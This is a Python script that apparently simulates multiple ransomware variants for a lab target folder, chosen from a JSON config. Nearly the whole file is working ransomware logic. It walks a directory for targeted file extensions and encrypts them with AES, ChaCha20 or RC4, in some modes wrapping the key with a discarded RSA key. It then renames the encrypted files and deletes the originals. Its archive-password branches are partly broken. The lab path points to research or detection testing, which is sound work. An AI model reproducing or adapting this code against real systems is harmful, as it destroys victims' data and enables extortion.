import json
import os
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding
from cryptography.hazmat.primitives.asymmetric import rsa, padding as rsa_padding
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.ciphers.aead import ChaCha20Poly1305
import zipfile
import py7zr
import rarfile
import gzip
import shutil

def load_ransomware_config():
    with open('ransom.json', 'r') as f:
        return json.load(f)

def list_ransomware_options(config):
    print("\nAvailable Ransomware Options:")
    for idx, ransomware in enumerate(config, 1):
        print(f"{idx}. {ransomware['ransomware']} ({ransomware['enc-algo']})")
    
    choice = int(input("\nSelect ransomware number: ")) - 1
    if 0 <= choice < len(config):
        return config[choice]
    return None

def generate_key(enc_type):
    if "AES" in enc_type:
        return os.urandom(32)  # 256-bit key
    elif "ChaCha20" in enc_type:
        return os.urandom(32)
    elif "RC4" in enc_type:
        return os.urandom(16)
    return None

def aes_encrypt(data, key):
    padder = padding.PKCS7(128).padder()
    padded_data = padder.update(data) + padder.finalize()
    iv = os.urandom(16)
    cipher = Cipher(algorithms.AES(key), modes.CBC(iv))
    encryptor = cipher.encryptor()
    encrypted_data = encryptor.update(padded_data) + encryptor.finalize()
    return iv + encrypted_data

def chacha20_encrypt(data, key, nonce):
    cipher = ChaCha20Poly1305(key)
    encrypted_data = cipher.encrypt(nonce, data, None)
    return encrypted_data

def rc4_encrypt(data, key):
    cipher = Cipher(algorithms.ARC4(key), mode=None)
    encryptor = cipher.encryptor()
    return encryptor.update(data) + encryptor.finalize()

def rsa_encrypt(data, public_key):
    encrypted = public_key.encrypt(
        data,
        rsa_padding.OAEP(
            mgf=rsa_padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    )
    return encrypted

def create_password_protected_zip(files, output_path, zip_type, password):
    if zip_type == "7zip":
        with py7zr.SevenZipFile(output_path, 'w', password=password) as archive:
            for file in files:
                archive.write(file, os.path.basename(file))
    
    elif zip_type == "RAR":
        with rarfile.RarFile(output_path, 'w', password=password) as archive:
            for file in files:
                archive.write(file, os.path.basename(file))
    
    elif zip_type == "gzip":
        # Note: gzip doesn't support password protection natively
        with gzip.open(output_path, 'wb') as f:
            for file in files:
                with open(file, 'rb') as src:
                    shutil.copyfileobj(src, f)
    
    elif zip_type == "Standard_zip":
        with zipfile.ZipFile(output_path, 'w', zipfile.ZIP_DEFLATED) as archive:
            for file in files:
                archive.write(file, os.path.basename(file))
                archive.setpassword(password.encode())

def encrypt_and_zip_files(target_dir, ransomware_config):
    rsa_key = rsa.generate_private_key(
        public_exponent=65537,
        key_size=2048
    )
    
    key = generate_key(ransomware_config['enc-type'])
    target_extensions = ransomware_config['targets']
    files_to_process = []
    
    # Collect files matching target extensions
    for root, _, files in os.walk(target_dir):
        for file in files:
            if any(file.lower().endswith(ext.lower()) for ext in target_extensions):
                files_to_process.append(os.path.join(root, file))
    
    if not files_to_process:
        print("No matching files found!")
        return
    
    # Handle zip cases
    if ransomware_config['zip_type'] != "None":
        zip_password = os.urandom(16).hex()
        zip_path = os.path.join(target_dir, f"encrypted_{ransomware_config['ransomware']}.{ransomware_config['zip_type']}")
        create_password_protected_zip(files_to_process, zip_path, ransomware_config['zip_type'], zip_password)
        print(f"Files zipped with password: {zip_password}")
        return
    
    # Handle encryption cases
    for file_path in files_to_process:
        with open(file_path, 'rb') as f:
            file_data = f.read()
        
        enc_type = ransomware_config['enc-type']
        
        if enc_type == "AES":
            encrypted_data = aes_encrypt(file_data, key)
        elif enc_type == "ChaCha20":
            nonce = os.urandom(12)
            encrypted_data = chacha20_encrypt(file_data, key, nonce)
        elif enc_type == "RC4":
            encrypted_data = rc4_encrypt(file_data, key)
        elif enc_type == "AES + RSA":
            encrypted_data = aes_encrypt(file_data, key)
            encrypted_key = rsa_encrypt(key, rsa_key.public_key())
            encrypted_data = encrypted_key + encrypted_data
        elif enc_type == "ChaCha20 + RSA":
            nonce = os.urandom(12)
            encrypted_data = chacha20_encrypt(file_data, key, nonce)
            encrypted_key = rsa_encrypt(key, rsa_key.public_key())
            encrypted_data = encrypted_key + nonce + encrypted_data
        elif enc_type == "RC4 + RSA":
            encrypted_data = rc4_encrypt(file_data, key)
            encrypted_key = rsa_encrypt(key, rsa_key.public_key())
            encrypted_data = encrypted_key + encrypted_data
        
        # Write encrypted data
        new_file_path = file_path + ransomware_config['extension']
        with open(new_file_path, 'wb') as f:
            f.write(encrypted_data)
        
        # Remove original file
        os.remove(file_path)
    
    print(f"Files encrypted using {ransomware_config['ransomware']} configuration")

def main():
    target_dir = r"D:\Cyber\Malware\MoSer\target"
    if not os.path.exists(target_dir):
        print(f"Target directory {target_dir} does not exist!")
        return
    
    config = load_ransomware_config()
    selected_ransomware = list_ransomware_options(config)
    
    if selected_ransomware:
        encrypt_and_zip_files(target_dir, selected_ransomware)
    else:
        print("Invalid selection!")

if __name__ == "__main__":
    main()